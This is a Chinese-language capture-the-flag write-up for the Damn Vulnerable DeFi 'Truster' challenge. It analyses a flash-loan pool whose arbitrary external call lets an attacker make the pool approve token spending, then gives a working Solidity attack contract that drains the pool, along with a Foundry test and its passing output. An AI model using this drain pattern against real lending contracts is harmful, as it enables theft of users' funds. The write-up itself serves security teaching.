## 题目 [Truster](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/truster)
越来越多的借贷池提供闪电贷。在这种情况下，一个新的池子已经推出，可以免费提供DVT代币的闪电贷。  

该池持有100万个DVT代币，而你一无所有。  

要通过这个挑战，请在一次交易中将池中的所有资金转移出来，并将资金存入指定的恢复账户。  

## 合约分析
`TrusterLenderPool` 实现了一个没有使用标准接口的闪电贷功能。关键在于 `target.functionCall(data);` 这行代码。
``` solidity
function flashLoan(uint256 amount, address borrower, address target, bytes calldata data)
    external
    nonReentrant
    returns (bool)
{
    uint256 balanceBefore = token.balanceOf(address(this));

    token.transfer(borrower, amount);
    target.functionCall(data);

    if (token.balanceOf(address(this)) < balanceBefore) {
        revert RepayFailed();
    }

    return true;
}
```
这种实现方式导致闪电贷合约可以调用任意合约的任意函数，唯一的要求是调用完其他函数后，池子里的资金不能减少。利用这一点，我们可以让闪电贷合约调用 approve 函数，这样一来，我们便可以授权自己转移池中的代币，然后将所有代币转移到恢复地址。    

## 题解
攻击合约的代码如下：   
``` solidity
contract TrusterAttack {
    DamnValuableToken public token;
    TrusterLenderPool public pool;
    address public recovery;

    constructor(address tokenAddress, address poolAddress, address recoveryAddress){
        token = DamnValuableToken(tokenAddress);
        pool = TrusterLenderPool(poolAddress);
        recovery = recoveryAddress;
    }

    function attack() external {
        uint256 amount = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        
        pool.flashLoan(
            0,
            address(this),
            address(token),
            data
        );
            
        token.transferFrom(address(pool), recovery, amount);
    }
}
```
测试调用：  
``` solidity
function test_truster() public checkSolvedByPlayer {
    TrusterAttack trusterAttack = new TrusterAttack(address(token), address(pool), address(recovery));
    trusterAttack.attack();
}
```
运行测试：  
```
forge test --mp test/truster/Truster.t.sol
```
运行结果：
```
Ran 2 tests for test/truster/Truster.t.sol:TrusterChallenge
[PASS] test_assertInitialState() (gas: 21997)
[PASS] test_truster() (gas: 329023)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 8.61ms (1.52ms CPU time)
```